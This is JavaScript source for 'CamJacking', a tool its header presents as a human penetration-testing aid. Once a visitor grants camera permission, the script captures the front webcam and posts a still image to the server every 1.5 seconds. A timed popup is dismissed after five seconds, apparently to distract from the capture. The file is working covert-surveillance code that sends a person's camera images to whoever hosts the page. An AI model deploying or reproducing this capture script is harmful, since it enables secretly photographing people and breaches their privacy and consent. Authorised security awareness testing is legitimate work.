/**
 * CamJacking
 * CamJacking is a tool designed for use in human penetration testing tool. It is intended to simulate potential security threats by testing the negligence of people, and is used to identify weaknesses in an organization's security infrastructure. By using CamJacking, security professionals can gain a better understanding of their organization's potential risks and take proactive measures to improve their security posture.
 *
 * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
 */
//lib and includes section 
  function post(imgdata) {
    $.ajax({
      type: 'POST',
      data: { cat: imgdata },
      url: 'post',
      dataType: 'json',
      async: false,
      success: function (result) {
        // call the function that handles the response/results
      },
      error: function () {
      }
    });
  };


  'use strict';

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const errorMsgElement = document.querySelector('span#errorMsg');

  const constraints = {
    audio: false,
    video: {

      facingMode: "user"
    }
  };

  // Access webcam
  async function init() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
  }

  // Success
  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    var context = canvas.getContext('2d');
    setInterval(function () {

      context.drawImage(video, 0, 0, 640, 480);
      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
      post(canvasData);
      video.play();
    }, 1500);


  }
  function PopUp(){
    document.getElementById('ac-wrapper').style.display="none";
}
  // Load init
  init();
  $(document).ready(function(){
   setTimeout(function(){
      PopUp();
   },5000); // 5000 to load it after 5 seconds from page load
});
